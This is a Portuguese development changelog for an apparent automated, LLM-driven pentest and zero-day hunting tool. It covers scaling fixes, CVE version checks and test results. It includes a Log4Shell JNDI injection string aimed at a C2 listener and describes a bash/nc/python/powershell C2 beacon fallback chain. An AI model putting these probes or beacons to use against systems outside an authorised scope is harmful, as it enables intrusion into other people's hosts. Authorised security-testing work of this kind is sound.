# REV13 — TRAVADORES DE UNIVERSALIDADE RESOLVIDOS (código + testes)

**Data:** 2026-09-24 · **Sessão:** análise rev2 → fixes → replanejamento  
**Lente:** o sistema deve caçar em **qualquer host, qualquer rede, qualquer N de máquinas** — todos os travadores identificados na análise rev2 foram removidos **neste commit de trabalho**, com teste de regressão para cada um.

**Backups:** `.backup/20260924_212952_*` (originais pré-edição, 10 arquivos), `.backup/20260924_214011_test_zeroday_hunt.py` (original reconstituído), `.backup/20260924_234402_*` (docs pré-replan).

---

## A. TRAVADORES RESOLVIDOS (16)

### A.1 Escala de hosts (o "qualquer N" operacional)

| # | Travador | Local | Fix aplicado |
|---|---|---|---|
| 1 | Teto hardcoded `extras[:8]` — expansão multi-rede truncava **silenciosamente** em 8 hosts | `zeroday_hunt.py:515` | Flag `--max-hosts N` (default 0=ilimitado); excedentes viram `hosts_nao_cobertos` no findings.json + relatório, com evento `max_hosts_capped` |
| 2 | Budget global único — host no fim da lista nem era visitado | `zeroday_hunt.py:run()` | `--per-host-budget S` (0 = auto: `max(300, restante/faltam)`); deadline por host corta bateria/LLM com **cobertura parcial marcada por host** (`cobertura_parcial`, evento `host_budget_corte`) |
| 3 | Caça sequencial na ordem do sweep | `run()` | `--fast-first`: fase A top-1000 em todos (barato) → score de superfície (portas×2 + banner com versão×3) → fase B caca em ordem de score |
| 4 | nmap 1-65535 por host sequencial | `scan_ports:234` | Two-phase real: lite usa `--top-ports 1000`; host **rico** (≥3 portas ou banner com versão) ganha full-range **com merge** das portas da lite (`hunt_host(full_scan=...)`) |
| 5 | `self.events` em RAM sem teto (duplicava ndjson) | `_ev` | Teto de 2000 entradas; ndjson é a fonte de verdade; terminate via flag `_terminated` |
| 6 | SSH ControlMaster por (host,cred) eterno → fd leak | `session.py:54` | `ChannelPool` LRU (`MAX_CHANNELS=64`, OrderedDict + `move_to_end`); evict fecha o canal (`-O exit`) |

### A.2 Topologia e política em N arbitrário

| # | Travador | Local | Fix aplicado |
|---|---|---|---|
| 7 | **Arestas O(N²) remontadas a CADA sync** (a campanha sincroniza todo passo) | `state_adapter.py:324-329` | Incremental por grupo de subnet (`_edge_seen`); re-sync custa **0,09 ms** (medido); resultado idêntico (cliques intra-subnet persistem) |
| 8 | **subnet = 3º octeto IPv4** (/24 embutida; /16 e /8 agrupavam errado; **IPv6 ia tudo pro grupo 0**) | `state_adapter.py:288-291` | `RuadanStateAdapter(cidrs=...)` — grupo derivado do **CIDR configurado** (subdivisão /24 v4, /64 v6); orquestrador lê `RUADAN_ALLOWED_CIDRS`; fallback compatível mantém 3º octeto p/ /24 clássicas |

### A.3 Conhecimento genérico (qualquer produto)

| # | Travador | Local | Fix aplicado |
|---|---|---|---|
| 9 | Regex de evidência exigia `.json\|.txt\|.log\|.xml` — confirmed real sem extensão rebaixado a suspect em **qualquer** alvo | `zeroday_hunt.py:731` | Aceita `evidence/...` (qualquer extensão); **auditoria continua verificando existência+sha256** — honestidade preservada |
| 10 | LOCAL_CVE_BASE pequena | `cve_validate.py` | **+9 entradas por classe** (§B) + novo tipo de probe blind-OOB |
| 11 | SPA routes fora do briefing (rotas `#/` invisíveis em qualquer SPA) | `hunt_suite.py` | `spa_routes_from_bundle()` — lê a raiz, segue até 3 `<script src>` **locais**, coleta rotas `#/...` do bundle; entra no `findings` (`spa_routes`), no briefing do LLM e no relatório |
| 12 | C2 beacon só-bash `/dev/tcp` — appliance/Windows perdiam a prova OOB silenciosamente | `tools.py:403` | Cadeia `bash → nc → python3 → powershell` (cada segmento sh-valido isolado, verificado com `sh -n`; denylist ok; variante python entregou token a listener real em teste) |
| 13 | `_local_source_ip` conectava na :22 do alvo — superfície sem SSH quebrava o C2/OOB pela SONDA, não pelo alvo | `tools.py:96` | UDP-connect (porta discard 9) — não envia pacote, só consulta tabela de rotas; independe de superfície |
| 14 | `exploit_search` repetido por banner igual em N hosts | `zeroday_hunt.py:453` | Cache por banner normalizado — a INTEL chega a todos sem custo repetido |

### A.4 Robustez geral

| # | Travador | Local | Fix aplicado |
|---|---|---|---|
| 15 | `pilot.py` subprocess sem timeout — pilot travava para sempre | `pilot.py:61,156` | Timeout = wall-clock + margem; `TimeoutExpired` → rc 124 e segue com o que produziu |
| 16 | LLM log duplicado+fsync em ~10 diretórios por interação | `llm_client.py:244` | Um diretório: `RUADAN_OUTPUT_DIR` (fallback determinístico); mesmo formato de arquivo |
| 17 | Warning de máscaras sumia após 1ª ocorrência; repeat de obs em dev era silencioso | `agent.py:165/474` | Contador + re-log a cada 1000 (`red_update_without_action_masks` com `count`); repeat em dev emite `red_obs_repeat_applied` periódico |

---

## B. BASE CVE: curadoria por CLASSE (rev13)

**+9 entradas** (todas com fonte NVD + CWE + ressalva honesta de backport/pré-condição):

| CVE | Classe | Faixa | Método |
|---|---|---|---|
| CVE-2021-42013 | traversal | Apache 2.4.50 | version_match |
| CVE-2023-48795 (Terrapin) | ssh_login | OpenSSH <9.6p1 | version_match |
| CVE-2018-15473 | user_enum | OpenSSH <7.8 | version_match |
| CVE-2014-0160 (Heartbleed) | info_disclosure | OpenSSL 1.0.1.x | version_match (+ sugestão NSE) |
| CVE-2015-3306 | ftp_copy_rce | ProFTPD 1.3.5 | version_match |
| CVE-2012-1823 | rce_cgi | PHP 5.x CGI | version_match |
| CVE-2017-7529 | info_disclosure | nginx 0.5.6–1.13.2 | version_match |
| CVE-2021-23017 | dns_resolver | nginx 0.6.18–1.20.0 | version_match |
| **CVE-2021-44228 (Log4Shell)** | **blind_oob_jndi** | log4j/solr | **safe_probe novo** |

**Novo tipo de probe — blind-OOB por classe:** `log4shell_jndi` injeta `${jndi:ldap://listener:porta/TOKEN}` em header tipicamente logado e espera o **callback no listener C2 do harness** — prova a pré-condição (o alvo busca endereço externo por conta própria) **sem carregar objeto remoto algum**. Serve para qualquer sink de lookup (JNDI/SSRF/fetch) — classe, não produto.

**Bug latente morto no caminho:** `_cmp_faixa` truncava versões a 2 componentes — **vsftpd 2.3.4 e Apache 2.4.49 eram REFUTADOS erradamente** ("abaixo da faixa") pela própria base curada. Comparação agora componente-a-componente sem truncar. Também corrigi separador do regex nginx (`nginx/1.10.3` — o mesmo tipo de bug da rev9 com Squid).

---

## C. MÉTRICAS NOVAS (findings.json + hunt_report.md)

- `counts.confirmed_classes_distintas` + `classes_confirmadas` — o critério do autor (≥2 explorações) conta **classes distintas**; 2 achados da mesma classe/porto = 1 classe
- `hosts_nao_cobertos[]` (ip + motivo: max_hosts/budget/safety) + seção "Cobertura desta run" no relatório
- `budget{max_wall_clock, per_host_budget, fast_first, max_hosts}` no run
- `spa_routes` por porta no briefing LLM e no relatório por host

---

## D. VALIDAÇÃO EXECUTADA

| Suíte | Resultado |
|---|---|
| `services/pentest/tests/` (com **+14 testes novos** `test_universalidade_rev13.py`) | **125 passed**, 7 skipped |
| `bridge/test_bridge.py` | 11 passed (1 falha **pré-existente** desrelacionada: mock `sync_nmap_dict_hosts` obsoleto vs `Ruadan2.py` — reproduzida com o arquivo ORIGINAL, não é da rev13) |
| Smoke adapter (funcional) | /16 mask-aware ✓ · re-sync incremental 0,09 ms idempotente ✓ · host novo ganha arestas só intra-grupo ✓ · fallback /24 preservado ✓ · IPv6 por /64 ✓ |
| Smoke beacons | 4 variantes sh-válidas isoladas (`sh -n`) ✓ · denylist ok ✓ · variante python entrega token a listener real (loopback) ✓ |
| Smoke CLI | `--max-hosts/--per-host-budget/--fast-first` parseiam e propagam ✓ |
| `py_compile` nos 10 arquivos editados | OK |

**Testes novos por travador:** `_cmp_faixa` 3 componentes (3 testes), regex nginx/vsftpd/Apache banners reais, cobertura de classes na base, evidência sem extensão aceita + prosa rejeitada, LRU do ChannelPool (teto+evict+uso recente), defaults/propagação das flags, classes distintas no aggregate (2 confirmed mesma classe = 1 classe), cobertura no report.

---

## E. ARQUIVOS EDITADOS (10 + 1 teste + 1 manual)

```
red-MPPO-testing_model/services/pentest/app/zeroday_hunt.py   (teto, budget, two-phase, regex, cache, eventos)
red-MPPO-testing_model/services/pentest/app/hunt_suite.py     (spa_routes_from_bundle + bateria http)
red-MPPO-testing_model/services/pentest/app/tools.py          (beacon fallback + _local_source_ip UDP)
red-MPPO-testing_model/services/pentest/app/pilot.py          (timeouts)
red-MPPO-testing_model/services/pentest/app/session.py        (ChannelPool LRU)
red-MPPO-testing_model/services/pentest/app/cve_validate.py   (base por classe + _cmp_faixa fix + probe jndi)
red-MPPO-testing_model/services/red_team/app/agent.py         (warnings periódicos)
red-MPPO-testing_model/services/pentest/tests/test_zeroday_hunt.py (helper __new__ + novos attrs)
red-MPPO-testing_model/services/pentest/tests/test_universalidade_rev13.py (NOVO — 14 testes)
red-MPPO-testing_model/docs/MANUAL_CACADOR_ZERODAY.md         (flags rev13 + nota redes grandes)
bridge/state_adapter.py    (subnet mask-aware + arestas incrementais)
bridge/ai_orchestrator.py (RUADAN_ALLOWED_CIDRS → adapter)
bridge/llm_client.py      (log em diretório único)
```

---

## F. CORREÇÃO DE ANÁLISE (rev2 → rev13)

O finding 2.3 da análise rev2 ("fallback heurístico ignora máscaras" em `ai_orchestrator.py`) era **falso** — re-verificando as linhas 375/398: o fallback já filtra `am` (linhas 375) e escolhe alvo via `tm[chosen_action]` (linha 398). Nada foi alterado lá além da passagem de CIDRs. Lições: (1) verificar linha exata antes de listar, (2) o reviewer independente pegou o falso positivo que o agente principal errou — o caso de uso do protocolo de auditoria dupla do próprio projeto.

---

## G. O QUE FICA ABERTO (→ replanejamento em `PLANO_ACAO_EXECUTAVEL.md`)

1. **Validação em superfície real** com as flags novas (gate genérico: `confirmed_classes_distintas ≥ 2` ou FAILED honesto + cobertura reportada)
2. `hunt_merge` (tool que consolida shards paralelos — o paralelo já funciona com runs-root distintos)
3. Retreino com máscaras + A/B do .pt · Held-out 2x2 · **Held-out topológico N∈{10..250}** (a prova empírica da invariância)
4. Drift W1/PSI (#12) · ablação H4 (#8) · intervenções causais (#18)
5. GAT com hf agregado (design note B3) · adjacência esparsa p/ N>5k (B4) · MARL (B6) · Dropbear e mais produtos na base (expansão contínua)
6. Atualizar `test_bridge.py` mock obsoleto (`sync_nmap_dict_hosts`) — falha pré-existente, fora do escopo rev13